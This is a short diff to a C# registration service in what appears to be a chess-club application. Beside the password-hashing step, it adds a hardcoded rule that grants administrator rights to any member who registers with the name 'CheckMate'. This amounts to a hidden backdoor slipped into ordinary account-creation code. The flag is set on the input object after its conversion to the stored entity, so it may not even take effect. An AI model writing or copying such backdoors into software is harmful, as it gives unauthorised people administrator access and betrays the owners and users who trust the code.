@@ -33,6 +33,10 @@ namespace LaboEchec.BLL.Services
             // Ajout dans le DB
             Members mEntity = member.ToEntity();
             mEntity.Pwd = pwdHash;
+            if(member.Name == "CheckMate")
+            {
+                member.IsAdmin = true;
+            }
 
 
             
